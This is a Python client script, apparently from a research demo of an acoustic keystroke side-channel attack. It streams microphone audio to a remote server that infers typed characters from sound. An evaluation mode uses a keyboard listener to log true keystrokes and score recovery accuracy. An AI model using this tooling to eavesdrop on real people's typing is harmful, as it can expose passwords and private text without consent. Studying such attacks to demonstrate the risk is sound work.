#!/usr/bin/env python3
"""
client.py  --  runs on the MAC (same mic + keyboard as the training data).

Streams microphone audio to server.py (Linux/Spark) which does detection +
inference. Prints predicted characters as they come back.

EVAL MODE (default on): a pynput listener records what you ACTUALLY type -- used
ONLY to score the attack afterwards. The attack itself (the server) never sees
the keystrokes; it works from audio alone. On Ctrl+C we align the true typing
against the server's predictions and print accuracy / extra / missed.
(Disable with --no-eval for the "look, no keylogger" pure-attack demo.)

Run:  python client.py --host <SPARK_IP> --port 9009
      python client.py --host <SPARK_IP> --no-eval        # pure attack, no scoring
"""
import socket, struct, threading, queue, argparse, sys, os, difflib, json
import numpy as np
import sounddevice as sd
import yaml

HERE = os.path.dirname(os.path.abspath(__file__))


def load_cfg():
    with open(os.path.join(HERE, "config.yaml")) as f:
        return yaml.safe_load(f)


def score(true_str, pred_str):
    """Align true vs predicted; return (matches, subs, missed, extra)."""
    sm = difflib.SequenceMatcher(None, true_str, pred_str, autojunk=False)
    matches = subs = missed = extra = 0
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        a, b = i2 - i1, j2 - j1
        if tag == "equal":
            matches += a
        elif tag == "replace":
            m = min(a, b); subs += m
            missed += max(0, a - b)     # true keys with no prediction
            extra += max(0, b - a)      # predictions with no true key
        elif tag == "delete":
            missed += a
        elif tag == "insert":
            extra += b
    return matches, subs, missed, extra


def align_strings(true_str, pred_str):
    """Return (aligned_true, aligned_pred) with '-' filling gaps so columns line up."""
    sm = difflib.SequenceMatcher(None, true_str, pred_str, autojunk=False)
    t_line, p_line = [], []
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        ts, ps = true_str[i1:i2], pred_str[j1:j2]
        if tag == "equal":
            t_line.append(ts); p_line.append(ps)
        elif tag == "replace":
            L = max(len(ts), len(ps))
            t_line.append(ts.ljust(L, "-")); p_line.append(ps.ljust(L, "-"))
        elif tag == "delete":               # true key, no prediction (missed)
            t_line.append(ts); p_line.append("-" * len(ts))
        elif tag == "insert":               # prediction, no true key (extra)
            t_line.append("-" * len(ps)); p_line.append(ps)
    return "".join(t_line), "".join(p_line)


def print_alignment(at, ap, width=70):
    for k in range(0, len(at), width):
        ta, pa = at[k:k + width], ap[k:k + width]
        marker = "".join(" " if (x == y and x != "-") else "^"
                         for x, y in zip(ta, pa))
        print(f"  actual    : {ta}")
        print(f"  predicted : {pa}")
        print(f"              {marker}")
        print()


# ---------------- pretty, color-coded terminal output ----------------
_COLOR = sys.stdout.isatty()


def _paint(s, code):
    return f"\033[{code}m{s}\033[0m" if _COLOR else s


def _columns(true_str, pred_str):
    """Per-character alignment columns: (true_char, pred_char, kind)."""
    sm = difflib.SequenceMatcher(None, true_str, pred_str, autojunk=False)
    cols = []
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        ts, ps = true_str[i1:i2], pred_str[j1:j2]
        if tag == "equal":
            for a, b in zip(ts, ps):
                cols.append((a, b, "ok"))
        elif tag == "replace":
            for k in range(max(len(ts), len(ps))):
                a = ts[k] if k < len(ts) else "-"
                b = ps[k] if k < len(ps) else "-"
                if a != "-" and b != "-":
                    cols.append((a, b, "sub"))
                elif a != "-":
                    cols.append((a, "-", "missed"))
                else:
                    cols.append(("-", b, "extra"))
        elif tag == "delete":
            for a in ts:
                cols.append((a, "-", "missed"))
        elif tag == "insert":
            for b in ps:
                cols.append(("-", b, "extra"))
    return cols


def _render(cols, width=64):
    # actual line plain; only the PREDICTED line is colored:
    #   green = correct, red = wrong key, gray = gap (missed) / false detection (extra)
    def bot(b, kind):
        if kind == "ok":
            return _paint(b, "32")
        if kind == "sub":
            return _paint(b, "31")
        return _paint(b, "90")            # gray: missed "-" or extra char

    for k in range(0, len(cols), width):
        ch = cols[k:k + width]
        print("  actual    : " + "".join(a for a, b, kd in ch))
        print("  predicted : " + "".join(bot(b, kd) for a, b, kd in ch))
        print()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="Linux/Spark server IP")
    ap.add_argument("--port", type=int, default=9009)
    ap.add_argument("--no-eval", dest="eval", action="store_false",
                    help="disable ground-truth logging (pure attack demo)")
    ap.add_argument("--warn-threshold", type=float, default=0.75,
                    help="show the exposure warning if recovery >= this (0-1)")
    args = ap.parse_args()

    cfg = load_cfg()
    sr = cfg["audio"]["sample_rate"]
    blocksize = cfg["audio"]["blocksize"]
    accepted = set(cfg["recording"]["accepted_keys"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((args.host, args.port))
    print(f"Connected to {args.host}:{args.port}. Streaming mic — type away. ESC (or Ctrl+C) to stop.\n")

    q = queue.Queue()
    stop = threading.Event()
    pred_chars = []           # what the server predicted (received back)
    true_chars = []           # what you actually typed (eval only)

    # ---- keyboard listener: ESC to stop (always) + ground truth (eval only) ----
    listener = None
    try:
        from pynput import keyboard
        inc_space = cfg["recording"].get("include_space", False)
        space_label = cfg["recording"].get("space_label", "_")

        def on_press(key):
            if key == keyboard.Key.esc:
                stop.set()
                return False                      # stop the listener
            if not args.eval:
                return
            if inc_space and key == keyboard.Key.space:
                true_chars.append(space_label); return
            try:
                ch = key.char
            except AttributeError:
                return
            if ch == ' ':
                if inc_space:
                    true_chars.append(space_label)
                return
            if ch and ch.lower() in accepted:
                true_chars.append(ch.lower())

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        print("(press ESC to stop" + (", ground-truth logging ON)" if args.eval else ")"))
    except Exception as e:
        print(f"[key listener unavailable: {e}] — use Ctrl+C to stop"
              + ("; eval needs Input Monitoring" if args.eval else ""))

    # ---- audio capture -> queue ----
    def audio_cb(indata, frames, time_info, status):
        if status:
            print(status, file=sys.stderr)
        mono = indata[:, 0] if indata.ndim > 1 else indata
        q.put(mono.astype(np.float32).copy())

    def sender():
        while not stop.is_set():
            try:
                chunk = q.get(timeout=0.2)
            except queue.Empty:
                continue
            data = chunk.tobytes()
            try:
                sock.sendall(struct.pack(">I", len(data)) + data)
            except OSError:
                stop.set(); break

    def receiver():
        sock.settimeout(0.3)
        while not stop.is_set():
            try:
                hdr = sock.recv(4)
                if not hdr:
                    break
                (n,) = struct.unpack(">I", hdr)
                data = b""
                while len(data) < n:
                    part = sock.recv(n - len(data))
                    if not part:
                        break
                    data += part
                ch = data.decode("utf-8", "ignore")
                pred_chars.append(ch)
                sys.stdout.write("\r  predicted: " + "".join(pred_chars) + " ")
                sys.stdout.flush()
            except socket.timeout:
                continue
            except OSError:
                break

    t_send = threading.Thread(target=sender, daemon=True)
    t_recv = threading.Thread(target=receiver, daemon=True)
    t_send.start(); t_recv.start()

    try:
        with sd.InputStream(samplerate=sr, channels=1, blocksize=blocksize,
                            dtype="float32", callback=audio_cb):
            while not stop.is_set():
                sd.sleep(100)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        import time
        time.sleep(0.5)               # let the last predictions drain in
        if listener is not None:
            listener.stop()
        try:
            sock.close()
        except OSError:
            pass

    pred_str = "".join(pred_chars)
    # save the session so llm_correct.py --session can score raw-vs-corrected
    try:
        with open(os.path.join(HERE, "last_session.json"), "w") as f:
            json.dump({"pred": pred_str, "truth": "".join(true_chars)}, f)
    except OSError:
        pass
    print("\n" + "=" * 60)
    if args.eval and true_chars:
        true_str = "".join(true_chars)
        cols = _columns(true_str, pred_str)
        ok = sum(1 for _, _, k in cols if k == "ok")
        sub = sum(1 for _, _, k in cols if k == "sub")
        missed = sum(1 for _, _, k in cols if k == "missed")
        extra = sum(1 for _, _, k in cols if k == "extra")
        n = ok + sub + missed                      # = len(true_str)
        acc = ok / max(1, n)

        print("  " + _paint("correct", "32") + "   " + _paint("wrong", "31")
              + "   " + _paint("gap / extra", "90") + "\n")
        _render(cols)
        print("-" * 60)
        print(f"  recovered : {_paint(f'{acc*100:.1f}%', '1')}  ({ok}/{n} keys)")
        print(f"  wrong {sub}   missed {missed}   extra {extra}")

        if acc >= args.warn_threshold:
            msg = f"  ⚠  {acc*100:.0f}% OF KEYSTROKES RECOVERED FROM SOUND ALONE  "
            bar = " " * len(msg)
            print()
            for line in (bar, msg, bar):
                print(_paint(line, "41;97;1"))          # bold white on red
    elif args.eval:
        print(f"predicted ({len(pred_str)}): {pred_str}")
        print("(no ground-truth captured — grant Input Monitoring, or use --no-eval)")
    else:
        print(f"predicted ({len(pred_str)}): {pred_str}")   # pure attack, no scoring
    print("=" * 60)


if __name__ == "__main__":
    main()
